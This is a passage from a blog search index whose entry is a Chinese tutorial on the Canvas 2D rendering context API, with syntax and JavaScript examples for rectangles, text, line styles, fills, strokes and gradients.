<?xml version="1.0" encoding="utf-8"?>
<search> 
  
  
    
    <entry>
      <title>CanvasRenderingContext2D</title>
      <link href="/2024/11/05/frontend-canvas-canvasrenderingcontext2d/"/>
      <url>/2024/11/05/frontend-canvas-canvasrenderingcontext2d/</url>
      
        <content type="html"><![CDATA[<h2 id="了解CanvasRenderingContext2D"><a href="#了解CanvasRenderingContext2D" class="headerlink" title="了解CanvasRenderingContext2D"></a>了解CanvasRenderingContext2D</h2><p>CanvasRenderingContext2D顾名思义就是“Canvas 2D渲染上下文”，可以理解为下面代码中的context。</p><pre><code class="javascript">var canvas = document.querySelector(&#39;canvas&#39;);var context = canvas.getContext(&#39;2d&#39;);</code></pre><p>context暴露了大量的API属性和方法，可以用来绘制文本，图形以及像素处理等，可以说是2D Canvas应用的核心所在。</p><h2 id="绘制矩形"><a href="#绘制矩形" class="headerlink" title="绘制矩形"></a>绘制矩形</h2><h3 id="clearRect"><a href="#clearRect" class="headerlink" title=".clearRect()"></a>.clearRect()</h3><p>清除指定矩形区域内部所有的像素信息为初始色（通常为透明）。</p><ol><li>语法</li></ol><pre><code class="javascript">context.clearRect(x, y, width, height);</code></pre><ul><li>x  矩形左上角x坐标。</li><li>y  矩形左上角y坐标。</li><li>width  被清除的矩形区域的高度。</li><li>height  被清除的矩形区域的宽度度。</li></ul><ol start="2"><li>案例<br>先把一张图片绘制在Canvas画布上，然后再把中间一块矩形区域的像素信息清除，JavaScript代码如下：</li></ol><pre><code class="javascript">// 先绘制图片var img = new Image();img.onload = function () &#123;    context.drawImage(img, 0, 0, 250, 167);    // 中间开个方形的洞    context.clearRect(50, 50, 100, 66);&#125;;img.src = &#39;./1.jpg&#39;;</code></pre><p>一个圆球来回运动效果，不断clearRect清除，不断再绘制实现，本案例把时间放慢为每次刷新1000毫秒，便于我们肉眼也能感受Canvas中动画实现的基本原理。</p><pre><code class="javascript">context.font = &#39;16px STHeiti, SimHei&#39;;// 圆球的水平位置和半径var x = 30, radius = 30;// 清除方法var clear = function () &#123;    // 清除画布    context.clearRect(0, 0, 250, 167);    context.fillText(&#39;清除&#39;, 20, 30);    setTimeout(draw, 500);&#125;;// 绘制球方法var draw = function () &#123;    x += 10;    if (x &gt; 220) &#123;        x = 30;    &#125;    // 清除提示文字    context.clearRect(0, 0, 250, 167);    // 新的文字提示，以及圆绘制    context.fillText(&#39;绘制&#39;, 20, 30);    context.beginPath();    context.arc(x, 84, radius, 0, Math.PI * 2);    context.fillStyle = &#39;#039&#39;;    context.fill();    // 清除    setTimeout(clear, 500);&#125;;// 初始触发draw();</code></pre><h3 id="fillRect"><a href="#fillRect" class="headerlink" title=".fillRect()"></a>.fillRect()</h3><p>矩形填充，可以填充颜色，渐变，图案等。</p><ol><li>语法</li></ol><pre><code class="javascript">context.fillRect(x, y, width, height);</code></pre><ul><li>x  填充矩形的起点横坐标。</li><li>y  填充矩形的起点纵坐标。</li><li>width  填充矩形的宽度。</li><li>height  填充矩形的高度。</li></ul><ol start="2"><li>案例<br>填充两个矩形，绘制一个十字图形，直接上代码：</li></ol><pre><code class="javascript">var canvas = document.querySelector(&#39;canvas&#39;);var context = canvas.getContext(&#39;2d&#39;);// 中心点坐标var centerX = canvas.width / 2;var centerY = canvas.height / 2;// 矩形填充context.fillRect(centerX - 30, centerY - 4, 60, 8);context.fillRect(centerX - 4, centerY - 30, 8, 60);</code></pre><h3 id="strokeRect"><a href="#strokeRect" class="headerlink" title=".strokeRect()"></a>.strokeRect()</h3><p>矩形描边。</p><ol><li>语法</li></ol><pre><code class="javascript">context.strokeRect(x, y, width, height);</code></pre><ul><li>x  描边矩形的起点横坐标。</li><li>y  描边矩形的起点纵坐标。</li><li>width  描边矩形的宽度。</li><li>height  描边矩形的高度。</li></ul><ol start="2"><li>案例</li></ol><pre><code class="javascript">// 2像素宽矩形描边context.lineWidth = 2;context.strokeRect(75, 25, 150, 100);</code></pre><h2 id="绘制文本"><a href="#绘制文本" class="headerlink" title="绘制文本"></a>绘制文本</h2><h3 id="fillText"><a href="#fillText" class="headerlink" title=".fillText()"></a>.fillText()</h3><p>文字填充，可以填充纯色，渐变或者图案。</p><ol><li>语法</li></ol><pre><code class="javascript">context.fillText(text, x, y, maxWidth);</code></pre><ul><li>text  用来填充的文本信息。</li><li>x  填充文本的起点横坐标。</li><li>y  填充文本的起点纵坐标。</li><li>maxWidth  （可选）填充文本占据的最大宽度，当文本占据宽度超过此最大宽度时候，通过压缩每个文本宽度进行渲染，而非换行。</li></ul><ol start="2"><li>案例<br>基本绘制</li></ol><pre><code class="javascript">context.font = &#39;24px STheiti, SimHei&#39;;context.fillText(&#39;Canvas API中文网&#39;, 24, 66);</code></pre><p>maxWidth与文本缩放</p><pre><code class="javascript">context.font = &#39;24px STheiti, SimHei&#39;;context.fillText(&#39;Canvas API中文网，不只是文档&#39;, 20, 66, 200);</code></pre><p>Canvas中文本若想要自动换行，需要手动计算换行点，然后追行绘制。本案例借助这篇文章中扩展的wrapText()方法实现自动换行效果，</p><pre><code class="javascript">context.font = &#39;24px STheiti, SimHei&#39;;context.wrapText(&#39;Canvas API中文网，不只是文档&#39;, 24, 56, 200);</code></pre><h3 id="strokeText"><a href="#strokeText" class="headerlink" title=".strokeText()"></a>.strokeText()</h3><p>文字描边。</p><ol><li>语法</li></ol><pre><code class="javascript">context.strokeText(text, x, y, maxWidth);</code></pre><ul><li>text  用来描边的文本信息。</li><li>x  描边文本的起点横坐标。</li><li>y  描边文本的起点纵坐标。</li><li>maxWidth  （可选）填充文本占据的最大宽度，当文本占据宽度超过此最大宽度时候，通过压缩每个文本宽度进行渲染，而非换行。</li></ul><ol start="2"><li>案例<br>基本绘制</li></ol><pre><code class="javascript">// 文字描边context.font = &#39;50px STHeiti, SimHei&#39;;context.strokeText(&#39;文字描边&#39;, 50, 90);</code></pre><p>实色文字描边  实现方法就是叠加，文本描边效果上面叠加文本填充。因为文字描边是居中描边，如果文本描边效果在上，会使填充的文字变得很细。</p><pre><code class="javascript">// 文字样式context.font = &#39;50px STHeiti, SimHei&#39;;// 文字先描边context.lineWidth = 3;context.strokeStyle = &#39;red&#39;;context.strokeText(&#39;文字描边&#39;, 50, 90);// 再填充context.fillText(&#39;文字描边&#39;, 50, 90);</code></pre><h3 id="measureText"><a href="#measureText" class="headerlink" title=".measureText()"></a>.measureText()</h3><p>文字测量。返回TextMetrics对象，该对象的width属性值就是字符占据的宽度。</p><ol><li>语法</li></ol><pre><code class="javascript">context.measureText(text)</code></pre><ul><li>text  被测量的文本。</li></ul><ol start="2"><li>案例<br>示意输出一个中文字符宽度以及输出一个英文单词的宽度，宽度直接在Canvas文字右上方标记</li></ol><pre><code class="javascript">// 设置字体字号context.font = &#39;24px STHeiTi, SimHei&#39;;// 文本信息对象就有了var textZh = context.measureText(&#39;帅&#39;);var textEn = context.measureText(&#39;handsome&#39;);// 文字绘制context.fillText(&#39;帅&#39;, 60, 50);context.fillText(&#39;handsome&#39;, 60, 90);// 显示宽度context.font = &#39;12px Arial&#39;;context.fillStyle = &#39;red&#39;;context.fillText(&#39;宽&#39; + textZh.width, 62 + textZh.width, 40);context.fillText(&#39;宽&#39; + textEn.width, 62 + textEn.width, 80);</code></pre><h2 id="线条样式"><a href="#线条样式" class="headerlink" title="线条样式"></a>线条样式</h2><h3 id="lineWidth"><a href="#lineWidth" class="headerlink" title=".lineWidth"></a>.lineWidth</h3><p>线条宽度，主使用场景是描边，默认宽度是1.0，支持小数。</p><ol><li>语法</li></ol><pre><code class="javascript">context.lineWidth = value;</code></pre><ul><li>value  表示线的宽度。数值类型，默认值是1.0。如果是负数，0，NaN，或者Infinity都会忽略。</li></ul><ol start="2"><li>案例<br>绘制一个1像素宽的随机三角形。</li></ol><pre><code class="html">&lt;canvas width=&quot;240&quot; height=&quot;120&quot;&gt;&lt;/canvas&gt;</code></pre><pre><code class="javascript">// 随机三角形var canvas = document.querySelector(&#39;canvas&#39;);var context = canvas.getContext(&#39;2d&#39;);var width = canvas.width;var height = canvas.height;// 随机三个坐标点var positionA = [width * Math.random(), height / 2 * Math.random()];var positionB = [width / 2 * Math.random(), height / 2 + height / 2 * Math.random()];var positionC = [width / 2 + width / 2 * Math.random(), height / 2 + height / 2 * Math.random()];// 开始绘制context.beginPath();context.moveTo(positionA[0], positionA[1]);context.lineTo(positionB[0], positionB[1]);context.lineTo(positionC[0], positionC[1]);context.closePath();// 绘制，由于默认宽度就是1像素，因此// context.lineWidth设置缺省context.stroke();</code></pre><h3 id="lineCap"><a href="#lineCap" class="headerlink" title=".lineCap"></a>.lineCap</h3><p>线条端点的样式。支持如下属性值：butt（默认值，断头，无端帽），round（圆形端帽），square（方形端帽）。</p><ol><li>语法</li></ol><pre><code class="javascript">context.lineCap = &#39;butt&#39;;context.lineCap = &#39;round&#39;;context.lineCap = &#39;square&#39;;</code></pre><ul><li>butt  默认值，线的端点就像是个断头台，例如一条横线，终点x坐标是100，则这条线的最右侧边缘就是100这个位置，没有超出。</li><li>round  线的端点多出一个圆弧。</li><li>square  线的端点多出一个方框，框框的宽度和线一样宽，高度是线厚度的一半</li></ul><ol start="2"><li>案例<br>绘制一个loading菊花效果，点击菊花可以旋转</li></ol><pre><code class="html">&lt;canvas width=&quot;40&quot; height=&quot;40&quot;&gt;&lt;/canvas&gt;</code></pre><pre><code class="javascript">// 圆心坐标var center = [20, 20];// 线长度和距离圆心距离var length = 8, offset = 8;// 开始绘制context.lineWidth = 4;context.lineCap = &#39;round&#39;;for (var angle = 0; angle &lt; 360; angle += 45) &#123;  // 正余弦  var sin = Math.sin(angle / 180 * Math.PI);  var cos = Math.cos(angle / 180 * Math.PI);  // 开始绘制  context.beginPath();  context.moveTo(center[0] + offset * cos, center[1] + offset * sin);  context.lineTo(center[0] + (offset + length) * cos, center[1] + (offset + length) * sin);  context.strokeStyle = &#39;rgba(0,0,0,&#39;+ (0.25 + 0.75 * angle / 360) +&#39;)&#39;;  context.stroke();&#125;</code></pre><h3 id="lineJoin"><a href="#lineJoin" class="headerlink" title=".lineJoin"></a>.lineJoin</h3><p>线条转角的样式。支持如下属性值：miter（默认值，尖角），round（圆角），bevel（平角）。</p><ol><li>语法</li></ol><pre><code class="javascript">context.lineJoin = &#39;miter&#39;;context.lineJoin = &#39;round&#39;;context.lineJoin = &#39;bevel&#39;;</code></pre><ul><li>miter  默认值，转角是尖头。如果折线角度比较小，则尖头会非常长，因此需要miterLimit进行限制。</li><li>round  转角是圆头。</li><li>bevel  转角是平头。</li></ul><ol start="2"><li>案例<br>绘制一个圆润的三角箭头。点击下面的单选选项，可以切换箭头类型是单箭头还是双箭头。</li></ol><pre><code class="html">&lt;canvas id=&quot;arrow&quot; width=&quot;210&quot; height=&quot;100&quot;&gt;&lt;/canvas&gt;</code></pre><pre><code class="javascript">var canvas = document.getElementById(&#39;arrow&#39;);    var context = canvas.getContext(&#39;2d&#39;);// 起止点坐标，这里是示意var start = &#123; x: 20, y: 20 &#125;;var end = &#123; x: 190, y: 80 &#125;;// 计算两点距离，主要是为了计算斜率var distanceX = end.x - start.x, distanceY = end.y - start.y;var distance = Math.sqrt(distanceY * distanceY + distanceX * distanceX);// 箭头的尺寸var distanceArrow = 7, sharpeArrow = 3;// 先确定轴线与三角两个尖角点交汇坐标var arrowMoveTo = &#123;    x: start.x + distanceArrow * distanceX / distance,    y: start.y + distanceArrow * distanceY / distance&#125;;var arrowLineTo = &#123;    x: end.x - distanceArrow * distanceX / distance,    y: end.y - distanceArrow * distanceY / distance&#125;;// 4个对称点坐标var arrowTo1 = &#123;    x: arrowMoveTo.x - sharpeArrow * distanceY / distance,    y: arrowMoveTo.y + sharpeArrow * distanceX / distance&#125;;var arrowTo2 = &#123;    x: arrowMoveTo.x + sharpeArrow * distanceY / distance,    y: arrowMoveTo.y - sharpeArrow * distanceX / distance&#125;;var arrowTo3 = &#123;    x: arrowLineTo.x - sharpeArrow * distanceY / distance,    y: arrowLineTo.y + sharpeArrow * distanceX / distance&#125;;var arrowTo4 = &#123;    x: arrowLineTo.x + sharpeArrow * distanceY / distance,    y: arrowLineTo.y - sharpeArrow * distanceX / distance&#125;;// 设置线的粗细和断点，转角样式context.lineWidth = 2;context.lineCap = &#39;round&#39;;context.lineJoin = &#39;round&#39;;// 绘制方法var draw = function (arrow) &#123;    arrow = arrow || &#39;single&#39;;    // 清除画布    context.clearRect(0, 0, canvas.width, canvas.height);    // 开始绘制    context.beginPath();    // 三种箭头类型    switch (arrow) &#123;        case &#39;single&#39;: &#123;            context.moveTo(start.x, start.y);            context.lineTo(end.x, end.y);            // 两个结束对称点            context.lineTo(arrowTo3.x, arrowTo3.y);            context.lineTo(arrowTo4.x, arrowTo4.y);            // 回到结束点            context.lineTo(end.x, end.y);            break;        &#125;        case &#39;both&#39;: &#123;            context.moveTo(start.x, start.y);            // 两个起始对称点            context.lineTo(arrowTo1.x, arrowTo1.y);            context.lineTo(arrowTo2.x, arrowTo2.y);            // 回到起始点            context.lineTo(start.x, start.y);            // 重复single的绘制            context.lineTo(end.x, end.y);            context.lineTo(arrowTo3.x, arrowTo3.y);            context.lineTo(arrowTo4.x, arrowTo4.y);            context.lineTo(end.x, end.y);            break;        &#125;        case &#39;part-both&#39;: &#123;            // 先绘制起止线            context.moveTo(start.x, start.y);            context.lineTo(end.x, end.y);            // 结束点位置的半个箭头            context.lineTo(arrowTo4.x, arrowTo4.y);            context.lineTo(arrowLineTo.x, arrowLineTo.y);            context.closePath();            // 另一端的半箭头            context.moveTo(start.x, start.y);            context.lineTo(arrowTo1.x, arrowTo1.y);            context.lineTo(arrowMoveTo.x, arrowMoveTo.y);            break;        &#125;    &#125;    // 闭合，描边与填充    context.closePath();    context.stroke();    context.fill();&#125;;// 绘制单箭头draw();// 绘制双箭头// draw(&#39;both&#39;);// 绘制双向单侧箭头// draw(&#39;part-both&#39;);</code></pre><h3 id="miterLimit"><a href="#miterLimit" class="headerlink" title=".miterLimit"></a>.miterLimit</h3><p>尖角限制比率。线条的尖角如果没有限制，在线条粗角度小的情况下会很长很长，因此，需要一个限制比率。默认是10。</p><ol><li>语法</li></ol><pre><code class="javascript">context.miterLimit = value;</code></pre><ul><li>value  表示多大范围内转角表现为miter的宽度。数值类型，默认值是10.0。如果是负数，0，NaN，或者Infinity都会忽略。</li></ul><ol start="2"><li>案例<br>以最大斜接长度 5 绘制线条</li></ol><pre><code class="html">&lt;canvas id=&quot;myCanvas&quot;&gt;&lt;/canvas&gt;</code></pre><pre><code class="javascript">var c=document.getElementById(&quot;myCanvas&quot;);var ctx=c.getContext(&quot;2d&quot;);ctx.lineWidth=10;ctx.lineJoin=&quot;miter&quot;;ctx.miterLimit=5;ctx.moveTo(20,20);ctx.lineTo(50,27);ctx.lineTo(20,34);ctx.stroke();</code></pre><h3 id="getLineDash"><a href="#getLineDash" class="headerlink" title=".getLineDash()"></a>.getLineDash()</h3><p>返回当前虚线数值。返回值是一个偶数个数的数组。</p><ol><li>语法</li></ol><pre><code class="javascript">context.getLineDash();</code></pre><ul><li>返回值  返回值是一个数组，数组里面的值都是数字，称为数字列表。所谓虚线，就是一段实线一段空隙交替出现的条线，而这里的数字列表中的值表示的就是交替的实线和间隙的长度值。如果设置虚线时候的数字个数是奇数，则数组里面的数字会被复制和链接，这样数量就变成偶数，例如，虚线设置为[5, 10, 15]将返回[5, 10, 15, 5, 10, 15]。</li></ul><ol start="2"><li>案例<br>演示设置奇数个数的虚线，然后获取，看看值是多少。</li></ol><pre><code class="javascript">context.beginPath();context.moveTo(10, 60);context.lineTo(230, 60);context.setLineDash([5]);context.stroke();// 将getLineDash()结果绘制在画布上var dash = context.getLineDash();// 绘制文本context.font = &#39;16px arial&#39;;context.fillText(dash, 10, 48);// 控制台输出console.log(dash);</code></pre><h3 id="setLineDash"><a href="#setLineDash" class="headerlink" title=".setLineDash()"></a>.setLineDash()</h3><p>设置线条为虚线。</p><ol><li>语法</li></ol><pre><code class="javascript">ctx.setLineDash(segments);</code></pre><ul><li>segments  数值列表数组。例如[5, 5]，表示虚线的实线和透明部分长度是5像素和5像素。如果此参数值适合空数组[]，则表示实线，常用来重置虚线设置。</li></ul><ol start="2"><li>案例<br>绘制一条虚线，只是虚线多尺寸并存</li></ol><pre><code class="javascript">context.beginPath();context.setLineDash([5, 10, 15, 30]);context.moveTo(20, 70);context.lineTo(280, 70);context.stroke();</code></pre><h3 id="lineDashOffset"><a href="#lineDashOffset" class="headerlink" title=".lineDashOffset"></a>.lineDashOffset</h3><p>设置虚线的起始偏移。</p><ol><li>语法</li></ol><pre><code class="javascript">context.lineDashOffset = value;</code></pre><ul><li>value  表示虚线起始绘制的偏移距离，为浮点型，默认值是0.0。</li></ul><ol start="2"><li>案例<br>实现一个虚线边框不断旋转的效果</li></ol><pre><code class="html">&lt;canvas id=&quot;canvas&quot; width=&quot;240&quot; height=&quot;120&quot;&gt;&lt;/canvas&gt;</code></pre><pre><code class="javascript">var canvas = document.getElementById(&#39;canvas&#39;);var context = canvas.getContext(&#39;2d&#39;);// 偏移大小var offset = 0;// 绘制var draw = function () &#123;  context.clearRect(0,0, canvas.width, canvas.height);  context.setLineDash([8, 4]);  context.lineDashOffset = offset;  context.strokeRect(2, 2, 236, 116);&#125;var run = function () &#123;  offset += 0.5;  if (offset &gt; 24) &#123;    offset = 0;  &#125;  draw();  // 继续绘制  requestAnimationFrame(run);&#125;run();</code></pre><h2 id="文本样式"><a href="#文本样式" class="headerlink" title="文本样式"></a>文本样式</h2><h3 id="font"><a href="#font" class="headerlink" title=".font"></a>.font</h3><p>设置字体相关样式，包括字号，字体信息。默认值是10px sans-serif。(在Chrome浏览器中sans-serif不是默认字体，并且未能解析字体集关键字，从兼容性角度来说，在Canvas中sans-serif和serif尽量避免使用)</p><ol><li>语法</li></ol><pre><code class="javascript">context.font = value;</code></pre><ul><li>value  字号字体值，其规则和CSS的font很类似，除了一些很微小的细节差异，其他几乎没什么区别。</li></ul><ol start="2"><li>案例<br>一个简单的24px的宋体效果</li></ol><pre><code class="html">&lt;canvas width=&quot;240&quot; height=&quot;80&quot;&gt;&lt;/canvas&gt;</code></pre><pre><code class="javascript">var canvas = document.querySelector(&#39;canvas&#39;);var context = canvas.getContext(&#39;2d&#39;);// 设置字体样式context.font = &#39;24px SimSun, Songti SC&#39;;context.fillText(&#39;24px的宋体呈现&#39;, 20, 50);</code></pre><h3 id="textAlign"><a href="#textAlign" class="headerlink" title=".textAlign"></a>.textAlign</h3><p>设置文本水平对齐方式。支持属性值有：start（默认值），end，left，right以及center。</p><ol><li>语法</li></ol><pre><code class="javascript">context.textAlign = value;</code></pre><p>value支持以下值：</p><ul><li>left  文本左对齐。也就是最终绘制的文本内容最左侧位置就是设定的x坐标值。</li><li>right  文本右对齐。也就是最终绘制的文本内容最右侧位置就是设定的x坐标值。</li><li>center  文本居中对齐。也就是最终绘制的文本内容的水平中心位置就是设定的x坐标值。</li><li>start  文本起始方位对齐。如果文本是从左往右排列的，则表示左对齐；如果文本是从右往左排列的（例如设置context.direction为rtl），则表示右对齐。</li><li>end  文本结束方位对齐。如果文本是从左往右排列的，则表示右对齐；如果文本是从右往左排列的（例如设置context.direction为rtl），则表示左对齐。</li></ul><ol start="2"><li>案例<br>置水平x坐标是画布的水平中心位置，然后选择不同的textAlign属性值，</li></ol><pre><code class="html">&lt;canvas width=&quot;240&quot; height=&quot;120&quot;&gt;&lt;/canvas&gt;</code></pre><pre><code class="javascript">let align// 设置字体和字号context.font = &#39;48px STHeiti, SimHei&#39;;// 设置对齐方式context.textAlign = align || &#39;left&#39;;// 填充文字context.fillText(&#39;对齐&#39;, 120, 80);</code></pre><h3 id="textBaseline"><a href="#textBaseline" class="headerlink" title=".textBaseline"></a>.textBaseline</h3><p>设置文本基线对齐方式。支持属性值有：top，hanging，middle，alphabetic（默认值），ideographic，bottom。</p><ol><li>语法</li></ol><pre><code class="javascript">context.textBaseline = value;</code></pre><p>value支持以下值：</p><ul><li>top  设定的垂直y坐标作为文本em区域（em区域可以看成中文字符占据的区域）的顶部。</li><li>hanging  hanging主要在藏文和其他印度文字中使用，我们了解即可。</li><li>middle  设定的垂直y坐标作为文本em区域的垂直中心位置。</li><li>alphabetic  默认值。表示的是正常文本的基线，可以看成是字母x的下边缘。也就是设定的垂直y坐标就是字母x的下边缘。</li><li>ideographic  ideographic主要在汉语、日语和韩语中使用。字面直译是表意基线。含义为：如果字符的主体突出在字母基线之下，则这是字符主体的底部。例如汉字“中”比字母x位置更低，因此，底部是汉字主体的底部。</li><li>bottom  设定的垂直y坐标作为文本em区域的底部。</li></ul><ol start="2"><li>案例<br>展示不同的textBaseline属性值和文本对应的垂直位置关系</li></ol><pre><code class="javascript">var context = canvas.getContext(&#39;2d&#39;);var baselines = [&#39;top&#39;, &#39;hanging&#39;, &#39;middle&#39;, &#39;alphabetic&#39;, &#39;ideographic&#39;, &#39;bottom&#39;];context.font = &#39;30px STHeiti, SimHei&#39;;context.strokeStyle = &#39;red&#39;;baselines.forEach(function (baseline, index) &#123;    context.textBaseline = baseline;    var y = 75 + index * 75;    // 绘制参考线    context.beginPath();     context.moveTo(0, y + 0.5);     context.lineTo(550, y + 0.5);     context.stroke();    // 填充文字    context.fillText(&#39;AaXx一中-&#39; + baseline, 0, y);&#125;);</code></pre><h3 id="direction"><a href="#direction" class="headerlink" title=".direction"></a>.direction</h3><p>设置文本显示方向。支持属性值有：inherit（默认值），ltr和rtl。</p><ol><li>语法</li></ol><pre><code class="javascript">context.direction = value;</code></pre><p>value支持以下值：</p><ul><li>inherit  （默认值）继承父级属性配置</li><li>ltr  从左侧开始显示渲染</li><li>rtl  从右侧开始显示渲染</li></ul><ol start="2"><li>案例</li></ol><pre><code class="javascript">let align// 设置字体和字号context.font = &#39;48px STHeiti, SimHei&#39;;// 设置对齐方式context.direction = align || &#39;inherit&#39;;// 填充文字context.fillText(&#39;测试文字内容&#39;, 120, 80);</code></pre><h2 id="填充和描边"><a href="#填充和描边" class="headerlink" title="填充和描边"></a>填充和描边</h2><h3 id="fillStyle"><a href="#fillStyle" class="headerlink" title=".fillStyle"></a>.fillStyle</h3><p>填充样式。默认值是#000000纯黑色。</p><ol><li>语法</li></ol><pre><code class="javascript">context.fillStyle = color;context.fillStyle = gradient;context.fillStyle = pattern;</code></pre><ul><li>color  使用纯色填充，支持RGB，HSL，RGBA，HSLA以及HEX色值。</li><li>gradient  使用渐变填充，可以是线性渐变或者径向渐变。</li><li>pattern  使用纹理填充。由于图片也能作为纹理，因此fillStyle也能填充普通的位图，可参见下面的案例。</li></ul><ol start="2"><li>案例</li></ol><ul><li>色值填充</li></ul><pre><code class="html">&lt;canvas id=&quot;canvasColor&quot;&gt;&lt;/canvas&gt;</code></pre><pre><code class="javascript">var canvasColor = document.getElementById(&#39;canvasColor&#39;);var contextColor = canvasColor.getContext(&#39;2d&#39;);contextColor.fillStyle = &#39;RGB(255, 0, 0)&#39;;// RGB(255, 0, 0) // RGBA(255, 0, 0, .5)  // HSL(360, 100%, 50%) // HSLA(360, 100%, 50%, .5) // #FF0000contextColor.fillRect(10, 10, 100, 100);</code></pre><ul><li>渐变填充-线性</li></ul><pre><code class="html">&lt;canvas id=&quot;canvasLinear&quot;&gt;&lt;/canvas&gt;</code></pre><pre><code class="javascript">var canvasLinear = document.getElementById(&#39;canvasLinear&#39;);var contextLinear = canvasLinear.getContext(&#39;2d&#39;);// 创建线性渐变对象var gradientLinear = contextLinear.createLinearGradient(0, 0, 0, 100);gradientLinear.addColorStop(0, &#39;red&#39;);gradientLinear.addColorStop(1, &#39;green&#39;);// 填充线性渐变contextLinear.fillStyle = gradientLinear;contextLinear.fillRect(10, 10, 100, 100);</code></pre><ul><li>渐变填充-径向</li></ul><pre><code class="html">&lt;canvas id=&quot;canvasRadial&quot;&gt;&lt;/canvas&gt;</code></pre><pre><code class="javascript">var canvasRadial = document.getElementById(&#39;canvasRadial&#39;);var contextRadial = canvasRadial.getContext(&#39;2d&#39;);// 创建径向渐变对象，半径50var gradientRadial = contextRadial.createRadialGradient(60, 60, 0, 60, 60, 50);gradientRadial.addColorStop(0, &#39;red&#39;);gradientRadial.addColorStop(1, &#39;green&#39;);// 填充径向渐变contextLinear.fillStyle = gradientRadial;contextLinear.fillRect(10, 10, 100, 100);</code></pre><ul><li>图案填充</li></ul><pre><code class="html">&lt;canvas id=&quot;canvasPattern&quot;&gt;&lt;/canvas&gt;</code></pre><pre><code class="javascript">var canvasPattern = document.getElementById(&#39;canvasPattern&#39;);var contextPattern = canvasPattern.getContext(&#39;2d&#39;);// 创建图案对象var imagePattern = document.createElement(&#39;img&#39;);imagePattern.onload = function () &#123;    // 缩放原始图片到50*50大小    var canvas = document.createElement(&#39;canvas&#39;);    canvas.width = canvas.height = 50;    var context = canvas.getContext(&#39;2d&#39;);    // 通过drawImage()方法缩放    context.drawImage(this, 0, 0, 50, 50);    // 把这个创建的canvas图形作为图案使用    var pattern = contextPattern.createPattern(canvas, &#39;repeat&#39;);    // 填充图案    contextPattern.fillStyle = pattern;    contextPattern.fillRect(10, 10, 100, 100);&#125;;imagePattern.src = &#39;./pattern.jpg&#39;;</code></pre><h3 id="fill"><a href="#fill" class="headerlink" title=".fill()"></a>.fill()</h3><p>填充。</p><ol><li>语法</li></ol><pre><code class="javascript">context.fill();context.fill(fillRule);context.fill(path, fillRule);</code></pre><ul><li>fillRule  填充规则。用来确定一个点实在路径内还是路径外。可选值包括: nonzero：非零规则，此乃默认规则、evenodd：奇偶规则。</li><li>path  指Path2D对象。</li></ul><ol start="2"><li>案例<br>“非零规则”和“奇偶规则”的不同表现</li></ol><pre><code class="html">&lt;canvas width=&quot;300&quot; height=&quot;300&quot; data-rule=&quot;nonzero&quot;&gt;&lt;/canvas&gt;&lt;canvas width=&quot;300&quot; height=&quot;300&quot; data-rule=&quot;evenodd&quot;&gt;&lt;/canvas&gt;</code></pre><pre><code class="javascript">// 2个三角的点坐标var arrPoints = [[60,60], [240,100], [160,280], [60,60], [150,20], [260,260]];var canvases = document.querySelectorAll(&#39;canvas&#39;);// 遍历[].slice.call(canvases).forEach(function (canvas, index) &#123;    var rule = canvas.getAttribute(&#39;data-rule&#39;);    var context = canvas.getContext(&#39;2d&#39;);    // 开始绘制    context.beginPath();    context.moveTo(arrPoints[0][0], arrPoints[0][1]);    context.lineTo(arrPoints[1][0], arrPoints[1][1]);    context.lineTo(arrPoints[2][0], arrPoints[2][1]);        context.lineTo(arrPoints[3][0], arrPoints[3][1]);    context.lineTo(arrPoints[4][0], arrPoints[4][1]);    context.lineTo(arrPoints[5][0], arrPoints[5][1]);    context.closePath();    context.fillStyle = &#39;#0e65c5&#39;;    context.fill(rule);&#125;);</code></pre><h3 id="strokeStyle"><a href="#strokeStyle" class="headerlink" title=".strokeStyle"></a>.strokeStyle</h3><p>描边样式。默认值是#000000纯黑色。</p><ol><li>语法</li></ol><pre><code class="javascript">context.strokeStyle = color;context.strokeStyle = gradient;context.strokeStyle = pattern;</code></pre><ul><li>color  描边设置为颜色。</li><li>gradient  描边设置为渐变。</li><li>pattern  描边设置为图案。</li></ul><ol start="2"><li>案例</li></ol><ul><li>描边设置为颜色</li></ul><pre><code class="javascript">// 红色描边context.strokeStyle = &#39;red&#39;;context.lineWidth = 10;context.strokeRect(40, 20, 160, 80);</code></pre><ul><li>描边设置为渐变色</li></ul><pre><code class="javascript">// 红绿渐变var gradient = context.createLinearGradient(0, 0, 0, 120);gradient.addColorStop(0, &#39;red&#39;);gradient.addColorStop(1, &#39;green&#39;);// 渐变描边context.strokeStyle = gradient;context.lineWidth = 10;context.strokeRect(40, 20, 160, 80);</code></pre><ul><li>描边设置为图案</li></ul><pre><code class="javascript">// 照片作为描边图案var image = new Image();image.onload = function () &#123;    var pattern = context.createPattern(this, &#39;repeat&#39;);    context.strokeStyle = pattern;    context.lineWidth = 10;    context.strokeRect(40, 20, 160, 80);&#125;;image.src = &#39;1.jpg&#39;;</code></pre><h3 id="stroke"><a href="#stroke" class="headerlink" title=".stroke()"></a>.stroke()</h3><p>描边。</p><ol><li>语法</li></ol><pre><code class="javascript">context.stroke();context.stroke(path);</code></pre><ul><li>path  指Path2D对象。IE浏览器不支持。</li></ul><ol start="2"><li>案例<br>描边一条直线</li></ol><pre><code class="javascript">context.moveTo(50, 50);context.lineTo(250, 100);// 描边context.stroke();</code></pre><h2 id="渐变相关"><a href="#渐变相关" class="headerlink" title="渐变相关"></a>渐变相关</h2><h3 id="createLinearGradient"><a href="#createLinearGradient" class="headerlink" title=".createLinearGradient()"></a>.createLinearGradient()</h3><p>创建线性渐变。</p><ol><li>语法</li></ol><pre><code class="javascript">context.createLinearGradient(x0, y0, x1, y1);</code></pre><ul><li>返回值 返回值是CanvasGradient对象。</li><li>x0  渐变起始点横坐标。</li><li>y0  渐变起始点纵坐标。</li><li>x1  渐变结束点横坐标。</li><li>y1  渐变结束点纵坐标。<br>线性渐变效果比较好脑补，就是从坐标点[x0, y0]到坐标点[x1, y1]的位置画一条线，然后整个渐变色带与与这条线垂直。</li></ul><ol start="2"><li>案例<br>头尾二色渐变，以及渐变坐标的全局特性</li></ol><pre><code class="javascript">var context = canvas.getContext(&#39;2d&#39;);// 创建渐变var gradient = context.createLinearGradient(0, 0, 300, 0);gradient.addColorStop(0, &#39;red&#39;);gradient.addColorStop(1, &#39;green&#39;);// 设置填充样式为渐变context.fillStyle = gradient;// 左上角和右下角分别填充2个矩形context.fillRect(10, 10, 160, 60);context.fillRect(120, 80, 160, 60);</code></pre><h3 id="createRadialGradient"><a href="#createRadialGradient" class="headerlink" title=".createRadialGradient()"></a>.createRadialGradient()</h3><p>创建径向渐变。</p><ol><li>语法</li></ol><pre><code 